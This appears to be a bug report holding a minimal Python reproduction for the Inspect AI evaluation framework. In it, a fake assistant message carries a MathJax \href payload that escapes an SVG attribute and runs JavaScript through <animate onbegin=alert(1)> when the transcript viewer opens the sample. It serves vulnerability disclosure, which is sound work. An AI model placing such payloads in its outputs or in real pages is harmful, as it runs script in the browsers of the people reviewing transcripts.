    "body": "Repro:\n\n\n```\nfrom __future__ import annotations\n\nimport inspect_ai\nimport inspect_ai.dataset\nimport inspect_ai.model\nimport inspect_ai.scorer\nimport inspect_ai.solver\nfrom inspect_ai import task\n\n\n# Renders as MathJax, breaks out of the generated SVG href attribute, and uses\n# SVG SMIL <animate onbegin> to run JavaScript without user interaction.\nXSS_PAYLOAD = r'$\\href{x\"><animate onbegin=alert(1) attributeName=x dur=1s>}{z}$'\n\n\n@inspect_ai.solver.solver\ndef emit_xss() -> inspect_ai.solver.Solver:\n    async def solve(\n        state: inspect_ai.solver.TaskState,\n        generate: inspect_ai.solver.Generate,\n    ) -> inspect_ai.solver.TaskState:\n        state.messages.append(inspect_ai.model.ChatMessageAssistant(content=XSS_PAYLOAD))\n        state.output.completion = XSS_PAYLOAD\n        return state\n\n    return solve\n\n\n@task\ndef mathjax_xss_minimal_repro() -> inspect_ai.Task:\n    return inspect_ai.Task(\n        dataset=[\n            inspect_ai.dataset.Sample(\n                id=\"0\",\n                input=\"Open this sample in the Inspect transcript viewer.\",\n                target=\"z\",\n            )\n        ],\n        solver=[emit_xss()],\n        scorer=inspect_ai.scorer.includes(),\n    )\n",
